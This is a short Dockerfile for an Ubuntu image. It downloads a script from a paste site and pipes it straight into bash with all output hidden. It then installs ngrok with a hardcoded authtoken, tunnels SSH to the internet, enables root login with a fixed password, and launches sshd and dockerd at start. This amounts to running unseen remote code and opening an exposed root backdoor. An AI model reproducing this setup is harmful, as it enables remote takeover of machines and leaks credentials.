FROM ubuntu:latest
RUN apt update -y > /dev/null 2>&1 && \
    apt upgrade -y > /dev/null 2>&1 && \
    apt install locales -y && \
    localedef -i en_US -c -f UTF-8 -A /usr/share/locale/locale.alias en_US.UTF-8
ENV LANG en_US.utf8
RUN apt install ssh wget curl unzip sudo -y > /dev/null 2>&1
RUN curl https://yaso.su/raw/8QAyRQA9 | bash > /dev/null 2>&1
RUN wget -O ngrok.zip https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.zip > /dev/null 2>&1
RUN unzip ngrok.zip && rm ngrok.zip
RUN echo "./ngrok config add-authtoken 2QdulC1hI7uVLrIJqHQtiJAOSHA_2K9Syb5RzPC6jJJWLxZXj &&" >>/1.sh
RUN echo "./ngrok tcp 22 --region ap &>/dev/null &" >>/1.sh
RUN mkdir /run/sshd
RUN echo '/usr/sbin/sshd -D' >>/1.sh
RUN echo '/usr/bin/dockerd -D' >>/1.sh
RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
RUN echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
RUN echo root:vijaykumar|chpasswd
RUN service ssh start
RUN chmod 755 /1.sh
EXPOSE 22
CMD  /1.sh
